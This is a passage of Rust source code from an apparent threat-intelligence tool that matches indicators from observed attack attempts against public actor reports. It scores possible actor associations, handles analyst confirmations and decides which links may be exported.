        IocType::PayloadSha256 | IocType::FileSha256 => IndicatorType::Sha256,
        _ => return None,
    })
}

/// One subject per listed campaign, then one per attempt in no listed
/// campaign. Linear in attempts plus (IOC, attempt) pairs.
pub fn subjects(input: &SubjectInput<'_>) -> Vec<Subject> {
    let mut out: Vec<Subject> = Vec::new();
    let mut by_attempt: BTreeMap<&str, usize> = BTreeMap::new();
    let attempts: BTreeMap<&str, &Attempt> = input
        .attempts
        .iter()
        .filter(|a| a.tenant_id == input.tenant_id)
        .map(|a| (a.attempt_id.as_str(), a))
        .collect();
    for c in input
        .campaigns
        .iter()
        .filter(|c| c.tenant_id == input.tenant_id)
    {
        let i = out.len();
        let mut s = Subject {
            kind: SubjectKind::Campaign,
            id: c.campaign_id.clone(),
            tenant_id: c.tenant_id.clone(),
            seed_attempt_id: c.seed.attempt_id.clone(),
            attempt_ids: c.attempt_ids.clone(),
            first_seen: c.first_seen,
            techniques: c.feature_summary.ttp.techniques.iter().cloned().collect(),
            indicators: vec![],
            asns: c
                .feature_summary
                .infrastructure
                .asns
                .iter()
                .copied()
                .collect(),
            cves: c
                .feature_summary
                .targeting
                .cves
                .iter()
                .map(|v| v.to_ascii_uppercase())
                .collect(),
            catalogue_ids: c.catalogue_ids.iter().cloned().collect(),
            sources: BTreeSet::new(),
            countries: BTreeSet::new(),
        };
        for m in &c.members {
            s.sources.insert(m.src.clone());
            by_attempt.insert(m.attempt_id.as_str(), i);
        }
        s.set_countries(input.countries);
        for a in &c.attempt_ids {
            by_attempt.entry(a.as_str()).or_insert(i);
        }
        out.push(s);
    }
    for (id, a) in attempts.iter().filter(|_| input.lone_attempts) {
        if by_attempt.contains_key(id) {
            continue;
        }
        let sig = input.signals.get(*id);
        let mut cves: BTreeSet<String> = sig
            .map(|s| s.cves.iter().map(|v| v.to_ascii_uppercase()).collect())
            .unwrap_or_default();
        cves.extend(
            a.hook_hits
                .iter()
                .filter_map(|h| h.cve_id.as_ref().map(|v| v.to_ascii_uppercase())),
        );
        by_attempt.insert(id, out.len());
        out.push(Subject {
            kind: SubjectKind::Attempt,
            id: a.attempt_id.clone(),
            tenant_id: a.tenant_id.clone(),
            seed_attempt_id: a.attempt_id.clone(),
            attempt_ids: vec![a.attempt_id.clone()],
            first_seen: a.first_seen,
            techniques: sig.map(|s| s.techniques.clone()).unwrap_or_default(),
            indicators: vec![],
            asns: input.asns.get(&a.src).copied().into_iter().collect(),
            cves,
            catalogue_ids: BTreeSet::from([a.catalogue_id.clone()]),
            sources: BTreeSet::from([a.src.clone()]),
            countries: input.countries.get(&a.src).cloned().into_iter().collect(),
        });
    }
    let event_by_id: BTreeMap<&str, &CaptureEvent> = input
        .events
        .iter()
        .map(|e| (e.event_id.as_str(), e))
        .collect();
    // Built only for attempts with a callback indicator.
    let mut sent: BTreeMap<&str, Sent> = BTreeMap::new();
    // Per subject, the indicator index of each IOC already added.
    let mut seen: Vec<BTreeMap<&str, usize>> = vec![BTreeMap::new(); out.len()];
    for ioc in &input.iocs.iocs {
        let Some(kind) = indicator_type(ioc.ioc_type) else {
            continue;
        };
        let Some(v) = normalise(kind, &ioc.value) else {
            continue;
        };
        // Observed: the attack came from it, or the decoy itself contacted
        // it (egress or DNS events, whatever the role). A callback to a host
        // the attacker named in its own request or payload (JNDI, SSRF, a
        // download command), or to the address the decoy reached for such a
        // name, was chosen by the attacker, so it counts as sent. Decided
        // per attempt: one attempt naming a shared host does not make it
        // sent for another attempt that reached it unprompted.
        let source = ioc.roles.contains(&IocRole::Source);
        let callback = ioc.roles.contains(&IocRole::Callback)
            || ioc
                .extracted_from
                .iter()
                .any(|f| f.starts_with("egress:") || f.starts_with("dns:"));
        let host = host_of(kind, &v);
        for a in &ioc.attempt_ids {
            let Some(&i) = by_attempt.get(a.as_str()) else {
                continue;
            };
            let observed = source
                || (callback
                    && !host.is_some_and(|h| {
                        attempts.get(a.as_str()).is_some_and(|att| {
                            sent.entry(att.attempt_id.as_str())
                                .or_insert_with(|| Sent::of(att, &event_by_id))
                                .chose(h)
                        })
                    }));
            // In a campaign, an indicator any member observed unprompted
            // counts as observed.
            if let Some(&k) = seen[i].get(ioc.ioc_id.as_str()) {
                out[i].indicators[k].observed |= observed;
            } else if out[i].indicators.len() < MAX_SUBJECT_INDICATORS {
                seen[i].insert(&ioc.ioc_id, out[i].indicators.len());
                out[i].indicators.push(SubjectIndicator {
                    kind,
                    value: v.clone(),
                    ioc_id: ioc.ioc_id.clone(),
                    ioc_type: ioc.ioc_type,
                    observed,
                });
            }
        }
    }
    out
}

// ---------------------------------------------------------------------------
// Links
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum LinkStatus {
    Pending,
    Confirmed,
    Rejected,
}

/// An analyst action on an actor link (audited as `actor_link.<action>`).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Decision {
    Confirm,
    Reject,
    /// Back to pending.
    Reopen,
}

impl Decision {
    pub fn as_str(self) -> &'static str {
        match self {
            Decision::Confirm => "confirm",
            Decision::Reject => "reject",
            Decision::Reopen => "reopen",
        }
    }

    pub fn feedback(self) -> Feedback {
        match self {
            Decision::Confirm => Feedback::TruePositive,
            Decision::Reject => Feedback::FalsePositive,
            Decision::Reopen => Feedback::Unsure,
        }
    }
}

/// The latest analyst decision on one link, as stored.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ActorDecision {
    pub subject_id: String,
    pub actor_id: String,
    pub decision: Override,
    /// The subject's attempts when the analyst decided. A confirmation
    /// covers these only: attempts that join a campaign later are not
    /// confirmed by it (see [`ActorLink::new_since_confirmation`]).
    #[serde(default)]
    pub attempt_ids: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum MatchKind {
    Exact,
    /// The subject's domain is under a domain the report lists.
    Subdomain,
    /// The subject's address is in a network the report lists.
    InRange,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct MatchedTechnique {
    pub id: String,
    /// Profiles in the population using it.
    pub profiles_using: u32,
    /// 0 to 100; 100 when no other public profile uses it.
    pub rarity: u8,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct MatchedIndicator {
    #[serde(rename = "type")]
    pub kind: IndicatorType,
    /// The subject's value, defanged and escaped. Never parse this.
    pub display: String,
    #[serde(rename = "match")]
    pub match_kind: MatchKind,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub ioc_id: Option<String>,
    pub weight: u8,
    /// Listed in a report published more than [`STALE_AFTER_DAYS`] before
    /// the subject was first seen; counted at half weight.
    pub stale: bool,
    /// Observed by the defender as infrastructure in use (source or
    /// callback). False for values the attacker chose and sent, which count
    /// on the weak `actor_payload_overlap` source.
    pub observed: bool,
    pub source_url: String,
}

#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Matched {
    pub techniques: Vec<MatchedTechnique>,
    pub indicators: Vec<MatchedIndicator>,
    /// CVEs and catalogue ids the subject hit that the report says the
    /// actor targets.
    pub targeting: Vec<String>,
}

/// One possible association. Mirrors `schemas/actor-link.schema.json`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ActorLink {
    /// `acl_` plus 24 hex characters over tenant, subject and actor.
    pub link_id: String,
    pub tenant_id: String,
    pub subject_kind: SubjectKind,
    /// Campaign id or attempt id.
    pub subject_id: String,
    pub attempt_ids: Vec<String>,
    pub actor_id: String,
    pub label: String,
    pub label_kind: LabelKind,
    pub status: LinkStatus,
    /// "possible association", or "confirmed association" after an analyst
    /// confirmed it.
    pub wording: String,
    /// The only sentence UI and exports may use for this link.
    pub statement: String,
    pub score: u8,
    pub band: Band,
    pub publishable: bool,
    /// A review queue candidate (#35): pending and at or above
    /// `radar_queue_min`, or confirmed with attempts that joined since.
    pub review_queue: bool,
    /// Confirmed links: the attempts the analyst's confirmation covers (the
    /// subject's attempts at decision time that are still in it). Only
    /// these export as confirmed.
    #[serde(default)]
    pub confirmed_attempt_ids: Vec<String>,
    /// Confirmed links: attempts that joined after the confirmation. They
    /// are not covered by it, never export as confirmed, and put the link
    /// back in the review queue.
    #[serde(default)]
    pub new_since_confirmation: Vec<String>,
    pub matched: Matched,
    /// Overlaps that were seen and deliberately not counted.
    pub not_counted: Vec<String>,
    pub sources: Vec<Source>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub attack_version: Option<String>,
    pub example: bool,
    /// The full #27 explanation (kind `attempt_actor`, attempt: the seed,
    /// target: the label).
    pub confidence: ConfidenceLink,
}

/// `acl_` plus 24 hex characters of SHA-256 over tenant, subject and actor.
pub fn link_id(tenant_id: &str, subject_id: &str, actor_id: &str) -> String {
    let h =
        Sha256::digest(format!("{ID_DOMAIN}\n{tenant_id}\n{subject_id}\n{actor_id}").as_bytes());
    format!("acl_{}", hex::encode(&h[..12]))
}

/// The actor id behind an `attempt_actor` link, read from its evidence
/// signal ids (`actor:<actor id>:...`). Exporters use it to tell links to
/// ATT&CK groups (which carry MITRE's notice) from links to reports.
pub fn link_actor_id(link: &ConfidenceLink) -> Option<String> {
    link.evidence.iter().find_map(|e| {
        let rest = e.signal_id.strip_prefix("actor:")?;
        let mut parts = rest.splitn(3, ':');
        let id = format!("{}:{}", parts.next()?, parts.next()?);
        valid_actor_id(&id).then_some(id)
    })
}

/// True for an actor link to an ATT&CK group.
pub fn is_attack_group_link(link: &ConfidenceLink) -> bool {
    link.kind == LinkKind::AttemptActor
        && link_actor_id(link).is_some_and(|id| id.starts_with("attack:"))
}

/// True for ids of the `acl_` form.
pub fn valid_link_id(id: &str) -> bool {
    id.strip_prefix("acl_").is_some_and(|h| {
        h.len() == 24
            && h.bytes()
                .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
    })
}

/// True for ids of the `attack:` or `report:` form.
pub fn valid_actor_id(id: &str) -> bool {
    let rest = id
        .strip_prefix("attack:")
        .or_else(|| id.strip_prefix("report:"));
    rest.is_some_and(|r| {
        !r.is_empty() && r.len() <= 64 && r.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-')
    })
}

struct Hit {
    indicator: usize,
    kind: IndicatorType,
    display: String,
    match_kind: MatchKind,
    ioc_id: Option<String>,
    weight: u8,
    stale: bool,
    observed: bool,
}

fn base_weight(kind: IndicatorType, m: MatchKind) -> u8 {
    match (kind, m) {
        (IndicatorType::Sha256, _) => 100,
        (IndicatorType::Url, _) => 90,
        (IndicatorType::Domain, MatchKind::Exact) => 85,
        (IndicatorType::Domain, _) => 60,
        (IndicatorType::Ip, _) => 70,
        (IndicatorType::Cidr, _) => 40,
        // Scored on its own weak source, never as an indicator.
        (IndicatorType::Asn, _) => 100,
    }
}

/// Indicator hits per profile for one subject.
fn hits(cat: &ActorCatalogue, s: &Subject) -> BTreeMap<usize, Vec<Hit>> {
    let mut out: BTreeMap<usize, Vec<Hit>> = BTreeMap::new();
    let mut push =
        |pi: usize, ii: usize, kind, display: String, m, ioc: Option<&str>, observed: bool| {
            let p = &cat.profiles[pi];
            let mut weight = base_weight(kind, m);
            let src = p.indicators[ii].source;
            let stale = p
                .sources
                .get(src)
                .and_then(|x| date_ms(&x.published))
                .is_some_and(|pub_ms| s.first_seen - pub_ms > STALE_AFTER_DAYS * DAY_MS);
            if stale {
                weight /= 2;
            }
            out.entry(pi).or_default().push(Hit {
                indicator: ii,
                kind,
                display,
                match_kind: m,
                ioc_id: ioc.map(str::to_string),
                weight,
                stale,
                observed,
            });
        };
    for ind in &s.indicators {
        let (kind, value, ioc_id) = (&ind.kind, &ind.value, &ind.ioc_id);
        let display = printable(&defang(ind.ioc_type, value));
        let mut keys: Vec<(String, MatchKind)> = vec![(value.clone(), MatchKind::Exact)];
        if *kind == IndicatorType::Domain {
            let mut rest = value.as_str();
            while let Some((_, parent)) = rest.split_once('.') {
                if !parent.contains('.') {
                    break;
                }
                keys.push((parent.to_string(), MatchKind::Subdomain));
                rest = parent;
            }
        }
        for (k, m) in keys {
            for &(pi, ii) in cat.by_value.get(&(*kind, k)).into_iter().flatten() {
                push(
                    pi,
                    ii,
                    *kind,
                    display.clone(),
                    m,
                    Some(ioc_id),
                    ind.observed,
                );
            }
        }
        if *kind == IndicatorType::Ip
            && let Ok(ip) = value.parse::<IpAddr>()
        {
            for &(pi, ii, net, len) in &cat.cidrs {
                if in_cidr(ip, net, len) {
                    push(
                        pi,
                        ii,
                        IndicatorType::Cidr,
                        display.clone(),
                        MatchKind::InRange,
                        Some(ioc_id),
                        ind.observed,
                    );
                }
            }
        }
    }
    for asn in &s.asns {
        for &(pi, ii) in cat
            .by_value
            .get(&(IndicatorType::Asn, asn.to_string()))
            .into_iter()
            .flatten()
        {
            push(
                pi,
                ii,
                IndicatorType::Asn,
                format!("AS{asn}"),
                MatchKind::Exact,
                None,
                true,
            );
        }
    }
    // One hit per report indicator: observed before attacker-chosen, then
    // the strongest.
    for list in out.values_mut() {
        list.sort_by(|a, b| {
            use std::cmp::Reverse;
            (
                a.indicator,
                Reverse(a.observed),
                Reverse(a.weight),
                &a.display,
            )
                .cmp(&(
                    b.indicator,
                    Reverse(b.observed),
                    Reverse(b.weight),
                    &b.display,
                ))
        });
        list.dedup_by_key(|h| h.indicator);
        list.sort_by(|a, b| {
            (std::cmp::Reverse(a.weight), &a.display)
                .cmp(&(std::cmp::Reverse(b.weight), &b.display))
        });
    }
    out
}

/// Who published a source, and when. Titles are never quoted in text
/// Foiled writes: a title may itself make a claim ("... attributed to X")
/// that Foiled must not repeat. Titles stay in `sources[].title` as data.
fn citation(s: &Source) -> String {
    format!("{} ({})", printable(s.publisher.trim()), s.published)
}

fn join_words(parts: &[&str]) -> String {
    match parts {
        [] => String::new(),
        [one] => (*one).to_string(),
        [init @ .., last] => format!("{} and {last}", init.join(", ")),
    }
}

/// The sentence for a link. The only text Foiled produces about an actor
/// association: "possible association" unless an analyst confirmed it, and
/// never an attribution claim.
pub fn statement(label: &str, status: LinkStatus, overlap: &[&str], sources: &[Source]) -> String {
    let label = printable(label);
    let cite = match sources {
        [] => "a public source".to_string(),
        [one] => citation(one),
        [first, rest @ ..] => format!("{} and {} other source(s)", citation(first), rest.len()),
    };
    let what = join_words(overlap);
    match status {
        LinkStatus::Rejected => format!("An analyst rejected a possible association with {label}."),
        LinkStatus::Confirmed => format!(
            "Confirmed association with {label}, reviewed by an analyst: {what} overlap with \
             activity reported by {cite}."
        ),
        LinkStatus::Pending => format!(
            "Possible association with {label}: {what} overlap with activity reported by \
             {cite}. This is not an attribution."
        ),
    }
}

fn evaluate(
    cat: &ActorCatalogue,
    cfg: &ConfidenceConfig,
    s: &Subject,
    pi: usize,
    hits: &[Hit],
    decided: Option<&ActorDecision>,
) -> Option<ActorLink> {
    let decision = decided.map(|d| &d.decision);
    let p = &cat.profiles[pi];
    let shared: Vec<&String> = p
        .techniques
        .iter()
        .filter(|t| s.techniques.contains(*t))
        .collect();
    let observed_mass: f64 = s.techniques.iter().map(|t| cat.idf(t)).sum();
    let shared_mass: f64 = shared.iter().map(|t| cat.idf(t)).sum();
    let strong_hit = hits.iter().any(|h| h.kind != IndicatorType::Asn);
    let ttp_gate = shared.len() >= TTP_ONLY_MIN_SHARED && shared_mass >= TTP_ONLY_MIN_MASS;
    // Geography is never evidence, and a shared ASN is never enough.
    if !strong_hit && !ttp_gate {
        return None;
    }
    let primary = p.sources.first().map(|x| x.url.clone());
    let mut evidence = Vec::new();
    let mut overlap: Vec<&str> = Vec::new();
    let mut matched = Matched::default();

    let ttp_weight = if observed_mass > 0.0 {
        let coverage = shared_mass / observed_mass;
        (100.0 * coverage * (shared_mass / FULL_TTP_MASS).min(1.0))
            .round()
            .clamp(0.0, 100.0) as u8
    } else {
        0
    };
    if !shared.is_empty() && ttp_weight > 0 {
        let ids: Vec<&str> = shared.iter().map(|t| t.as_str()).collect();
        evidence.push(Evidence {
            signal_id: format!("actor:{}:ttp", p.actor_id),
            source: EvidenceSource::ActorTtpOverlap,
            weight: ttp_weight,
            summary: format!(
                "uses {} of the {} technique(s) seen ({}), rarity-weighted coverage {}%",
                shared.len(),
                s.techniques.len(),
                ids.join(", "),
                ((100.0 * shared_mass / observed_mass).round() as u32).min(100)
            ),
            reference: primary.clone(),
        });
        overlap.push("TTP");
        matched.techniques = shared
            .iter()
            .map(|t| MatchedTechnique {
                id: (*t).clone(),
                profiles_using: cat.users(t),
                rarity: cat.rarity_pct(t),
            })
            .collect();
    }

    let real = |h: &&Hit| h.kind != IndicatorType::Asn;
    if hits
        .iter()
        .filter(real)
        .any(|h| h.observed && !h.kind.is_tooling())
    {
        overlap.push("infrastructure");
    }
    if hits
        .iter()
        .filter(real)
        .any(|h| !h.observed && !h.kind.is_tooling())
    {
        overlap.push("request content");
    }
    if hits.iter().any(|h| h.kind.is_tooling()) {
        overlap.push("tooling");
    }
    for h in hits.iter().take(MAX_INDICATOR_EVIDENCE) {
        let ind = &p.indicators[h.indicator];
        let source = p.sources.get(ind.source).or(p.sources.first());
        let url = source.map(|x| x.url.clone()).unwrap_or_default();
        let how = match h.match_kind {
            MatchKind::Exact => "listed".to_string(),
            MatchKind::Subdomain => format!(
                "under {} listed",
                printable(&defang(IocType::Domain, &ind.value))
            ),
            MatchKind::InRange => format!("in network {} listed", printable(&ind.value)),
        };
        // Infrastructure the defender observed in use is an indicator. Values
        // the attacker chose and sent can be planted as a false flag, and an
        // ASN is shared by everyone on the same host: both count on their
        // own weak sources and never as a shared indicator.
        let (evidence_source, what) = match (h.kind, h.observed) {
            (IndicatorType::Asn, _) => (EvidenceSource::ActorAsnOverlap, "hosting"),
            (_, true) => (EvidenceSource::ActorIndicatorOverlap, "observed"),
            (_, false) => (EvidenceSource::ActorPayloadOverlap, "sent by the attacker"),
        };
        evidence.push(Evidence {
            signal_id: format!("actor:{}:indicator:{}", p.actor_id, h.indicator),
            source: evidence_source,
            weight: h.weight,
            summary: format!(
                "{} {} ({what}) {how} by {}{}",
                h.kind.as_str(),
                h.display,
                source.map(citation).unwrap_or_default(),
                if h.stale { " (stale: half weight)" } else { "" }
            ),
            reference: Some(url.clone()),
        });
        matched.indicators.push(MatchedIndicator {
            kind: h.kind,
            display: h.display.clone(),
            match_kind: h.match_kind,
            ioc_id: h.ioc_id.clone(),
            weight: h.weight,
            stale: h.stale,
            observed: h.observed,
            source_url: url,
        });
    }

    let cves: Vec<String> = p
        .targeting
        .cves
        .iter()
        .map(|c| c.to_ascii_uppercase())
        .filter(|c| s.cves.contains(c))
        .collect::<BTreeSet<_>>()
        .into_iter()
        .collect();
    let products: Vec<String> = p
        .targeting
        .catalogue_ids
        .iter()
        .filter(|c| s.catalogue_ids.contains(*c))
        .cloned()
        .collect::<BTreeSet<_>>()
        .into_iter()
        .collect();
    if !cves.is_empty() || !products.is_empty() {
        let list: Vec<String> = cves
            .iter()
            .chain(products.iter())
            .map(|x| printable(x))
            .collect();
        evidence.push(Evidence {
            signal_id: format!("actor:{}:targeting", p.actor_id),
            source: EvidenceSource::ActorTargeting,
            weight: if cves.is_empty() { 60 } else { 100 },
            summary: format!(
                "hit {}, which the source reports as targeted",
                list.join(", ")
            ),
            reference: primary.clone(),
        });
        overlap.push("targeting");
        matched.targeting = list;
    }

    let mut not_counted = Vec::new();
    let geo: Vec<&String> = p
        .geo
        .source_countries
        .iter()
        .filter(|c| s.countries.contains(*c))
        .collect();
    if !geo.is_empty() {
        let list: Vec<&str> = geo.iter().map(|c| c.as_str()).collect();
        not_counted.push(format!(
            "source country {} is in the geography the source reports; geography is never \
             evidence",
            list.join(", ")
        ));
    }
    if hits.iter().all(|h| h.kind == IndicatorType::Asn) && !hits.is_empty() {
        not_counted.push("a shared ASN on its own is never evidence".into());
    }
    if hits
        .iter()
        .any(|h| h.kind != IndicatorType::Asn && !h.observed)
    {
        not_counted.push(
            "values the attacker sent (request content, payload and file hashes) can be planted \
             as a false flag, so they count on a weak source and never as a shared indicator"
                .into(),
        );
    }

    let link = score(
        cfg,
        LinkKind::AttemptActor,
        &s.seed_attempt_id,
        &p.label,
        evidence,
        decision.cloned(),
    )?;
    let status = match decision.map(|d| d.feedback) {
        Some(Feedback::TruePositive) => LinkStatus::Confirmed,
        Some(Feedback::FalsePositive) => LinkStatus::Rejected,
        _ => LinkStatus::Pending,
    };
    // A confirmation covers the attempts the analyst saw, not later joiners.
    let (confirmed_attempt_ids, new_since_confirmation): (Vec<String>, Vec<String>) =
        if status == LinkStatus::Confirmed {
            let covered: BTreeSet<&str> = decided
                .map(|d| d.attempt_ids.iter().map(String::as_str).collect())
                .unwrap_or_default();
            s.attempt_ids
                .iter()
                .cloned()
                .partition(|a| covered.contains(a.as_str()))
        } else {
            (Vec::new(), Vec::new())
        };
    let mut text = statement(&p.label, status, &overlap, &p.sources);
    if !new_since_confirmation.is_empty() {
        text.push_str(&format!(
            " {} attempt(s) joined since the confirmation and are not covered by it.",
            new_since_confirmation.len()
        ));
    }
    Some(ActorLink {
        link_id: link_id(&s.tenant_id, &s.id, &p.actor_id),
        tenant_id: s.tenant_id.clone(),
        subject_kind: s.kind,
        subject_id: s.id.clone(),
        attempt_ids: s.attempt_ids.clone(),
        actor_id: p.actor_id.clone(),
        label: printable(&p.label),
        label_kind: p.label_kind,
        status,
        wording: link.wording.clone(),
        statement: text,
        score: link.score,
        band: link.band,
        publishable: link.publishable,
        review_queue: (link.radar_queue && status == LinkStatus::Pending)
            || !new_since_confirmation.is_empty(),
        confirmed_attempt_ids,
        new_since_confirmation,
        matched,
        not_counted,
        sources: p.sources.clone(),
        attack_version: p.attack_version.clone(),
        example: p.example,
        confidence: link,
    })
}

/// Every possible association for these subjects: per subject, the links
/// an analyst decided plus the [`MAX_LINKS_PER_SUBJECT`] strongest pending
/// ones. Sorted by subject (input order), then score (highest first), then
/// actor id. `decisions` are keyed by `(subject id, actor id)`.
pub fn suggest(
    cat: &ActorCatalogue,
    cfg: &ConfidenceConfig,
    subjects: &[Subject],
    decisions: &BTreeMap<(String, String), ActorDecision>,
) -> Vec<ActorLink> {
    let mut out = Vec::new();
    for s in subjects {
        let mut hit_map = hits(cat, s);
        let mut candidates: BTreeSet<usize> = hit_map.keys().copied().collect();
        // Technique overlap alone needs several shared techniques, so a
        // subject with fewer (a mass scanner's lone exploit) only reaches
        // profiles it shares an indicator with.
        if s.techniques.len() >= TTP_ONLY_MIN_SHARED {
            for t in &s.techniques {
                candidates.extend(cat.by_technique.get(t).into_iter().flatten().copied());
            }
        }
        let mut links: Vec<ActorLink> = candidates
            .into_iter()
            .filter_map(|pi| {
                let h = hit_map.remove(&pi).unwrap_or_default();
                let d = decisions.get(&(s.id.clone(), cat.profiles[pi].actor_id.clone()));
                evaluate(cat, cfg, s, pi, &h, d)
            })
            .collect();
        links.sort_by(|a, b| (b.score, &a.actor_id).cmp(&(a.score, &b.actor_id)));
        let mut pending = 0;
        links.retain(|l| {
            if l.status != LinkStatus::Pending {
                return true;
            }
            pending += 1;
            pending <= MAX_LINKS_PER_SUBJECT
        });
        out.extend(links);
    }
    out
}

/// Fill `suggested_actor_links` on each campaign from its pending and
/// confirmed links, strongest first, at most [`MAX_LINKS_PER_SUBJECT`].
pub fn attach_suggestions(campaigns: &mut [Campaign], links: &[ActorLink]) {
    for c in campaigns.iter_mut() {
        let mut mine: Vec<&ActorLink> = links
            .iter()
            .filter(|l| {
                l.subject_kind == SubjectKind::Campaign
                    && l.subject_id == c.campaign_id
                    && l.status != LinkStatus::Rejected
            })
            .collect();
        mine.sort_by(|a, b| (b.score, &a.actor_id).cmp(&(a.score, &b.actor_id)));
        c.suggested_actor_links = mine
            .into_iter()
            .take(MAX_LINKS_PER_SUBJECT)
            .map(|l| {
                let mut urls: Vec<String> = Vec::new();
                for s in &l.sources {
                    if !urls.contains(&s.url) && urls.len() < MAX_SUGGESTION_URLS {
                        urls.push(s.url.clone());
                    }
                }
                ActorSuggestion {
                    link_id: l.link_id.clone(),
                    actor_id: l.actor_id.clone(),
                    label: l.label.clone(),
                    wording: l.wording.clone(),
                    score: l.score,
                    band: l.band,
                    status: l.status,
                    review_queue: l.review_queue,
                    confidence_ref: format!("/v0/actor-links/{}", l.link_id),
                    report_urls: urls,
                }
            })
            .collect();
    }
}

/// Actor links for intel exports (#13), keyed by attempt id: one
/// `attempt_actor` link per attempt of every link that is publishable or
/// confirmed. Pending and rejected links never leave, whatever the export
/// options; the exporter adds its own gate and the actor opt-in on top.
pub fn export_links(links: &[ActorLink]) -> BTreeMap<String, Vec<ConfidenceLink>> {
    let mut out: BTreeMap<String, Vec<ConfidenceLink>> = BTreeMap::new();
    for l in links {
        if l.status == LinkStatus::Rejected || !(l.publishable || l.status == LinkStatus::Confirmed)
        {
            continue;
        }
        // A confirmation covers only the attempts the analyst saw; later
        // members fall back to the unconfirmed link, which never exports.
        let attempts = if l.status == LinkStatus::Confirmed {
            &l.confirmed_attempt_ids
        } else {
            &l.attempt_ids
        };
        for a in attempts {
            let mut c = l.confidence.clone();
            c.attempt_id = a.clone();
            out.entry(a.clone()).or_default().push(c);
        }
    }
    out
}

// ---------------------------------------------------------------------------
// Values
// ---------------------------------------------------------------------------

/// The comparable form of an indicator value, or `None` when invalid.
/// CIDR values are checked here and matched separately.
pub fn normalise(kind: IndicatorType, value: &str) -> Option<String> {
    let v = value.trim();
    if v.is_empty() || v.len() > 2048 {
        return None;
    }
    match kind {
        IndicatorType::Ip => v.parse::<IpAddr>().ok().map(|ip| ip.to_string()),
        IndicatorType::Cidr => parse_cidr(v).map(|(ip, len)| format!("{ip}/{len}")),
        IndicatorType::Domain => {
            let d = v.trim_end_matches('.').to_ascii_lowercase();
            let ok = d.contains('.')
                && d.len() <= 253
                && d.split('.').all(|l| {
                    !l.is_empty()
                        && l.len() <= 63
                        && l.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'-')
                });
            ok.then_some(d)
        }
        IndicatorType::Url => {
            let (scheme, rest) = v.split_once("://")?;
            if !matches!(scheme.to_ascii_lowercase().as_str(), "http" | "https") {
                return None;
            }
            let (auth, path) = match rest.find('/') {
                Some(i) => rest.split_at(i),
                None => (rest, ""),
            };
            if auth.is_empty() {
                return None;
            }
            Some(format!(
                "{}://{}{path}",
                scheme.to_ascii_lowercase(),
                auth.to_ascii_lowercase()
            ))
        }
        IndicatorType::Sha256 => {
            let h = v.to_ascii_lowercase();
            is_sha256(&h).then_some(h)
        }
        IndicatorType::Asn => {
            let n = v
                .strip_prefix("AS")
                .or_else(|| v.strip_prefix("as"))
                .unwrap_or(v);
            n.parse::<u32>().ok().map(|n| n.to_string())
        }
    }
}

fn parse_cidr(s: &str) -> Option<(IpAddr, u8)> {
    let (a, p) = s.trim().split_once('/')?;
    let ip: IpAddr = a.parse().ok()?;
    let len: u8 = p.parse().ok()?;
    // Very wide networks say nothing about an actor.
    let ok = match ip {
        IpAddr::V4(_) => (8..=32).contains(&len),
        IpAddr::V6(_) => (32..=128).contains(&len),
    };
    ok.then_some((ip, len))
}

fn in_cidr(ip: IpAddr, net: IpAddr, len: u8) -> bool {
    match (ip, net) {
        (IpAddr::V4(a), IpAddr::V4(n)) => {
            let mask = u32::MAX.checked_shl(32 - u32::from(len)).unwrap_or(0);
            u32::from(a) & mask == u32::from(n) & mask
        }
        (IpAddr::V6(a), IpAddr::V6(n)) => {
            let mask = u128::MAX.checked_shl(128 - u32::from(len)).unwrap_or(0);
            u128::from(a) & mask == u128::from(n) & mask
        }
        _ => false,
    }
}

fn is_sha256(s: &str) -> bool {
    s.len() == 64
        && s.bytes()
            .all(|b| b.is_ascii_digit() || (b'a'..=b'f').contains(&b))
}

fn valid_slug(s: &str) -> bool {
    (3..=64).contains(&s.len())
        && s.bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
        && !s.starts_with('-')
}

fn https_host(url: &str) -> Option<String> {
    let rest = url.strip_prefix("https://")?;
    let auth = rest.split(['/', '?', '#']).next()?;
    let host = auth.rsplit('@').next()?.split(':').next()?;
    (!host.is_empty()).then(|| host.to_ascii_lowercase())
}

/// RFC 2606 and RFC 6761 names.
fn reserved_domain(host: &str) -> bool {
    let h = host.trim_end_matches('.');
    ["example.com", "example.net", "example.org"]
        .iter()
        .any(|d| h == *d || h.ends_with(&format!(".{d}")))
        || [".example", ".invalid", ".test"]
            .iter()
            .any(|t| h.ends_with(t))
}

/// RFC 5737 and RFC 3849 documentation addresses, RFC 5398 documentation
/// ASNs and reserved domains.
fn example_indicator(kind: IndicatorType, v: &str) -> bool {
    let doc_ip = |ip: IpAddr| match ip {
        IpAddr::V4(a) => {
            let o = a.octets();
            matches!(
                (o[0], o[1], o[2]),
                (192, 0, 2) | (198, 51, 100) | (203, 0, 113)
            )
        }
        IpAddr::V6(a) => a.segments()[0] == 0x2001 && a.segments()[1] == 0x0db8,
    };
    match kind {
        IndicatorType::Ip => v.parse().is_ok_and(doc_ip),
        IndicatorType::Cidr => parse_cidr(v).is_some_and(|(ip, len)| {
            doc_ip(ip) && if ip.is_ipv4() { len >= 24 } else { len >= 32 }
        }),
        IndicatorType::Domain => reserved_domain(v),
        IndicatorType::Url => v
            .split_once("://")
            .and_then(|(_, r)| r.split(['/', '?', '#', ':']).next())
            .is_some_and(reserved_domain),
        IndicatorType::Sha256 => true,
        IndicatorType::Asn => v
            .parse::<u32>()
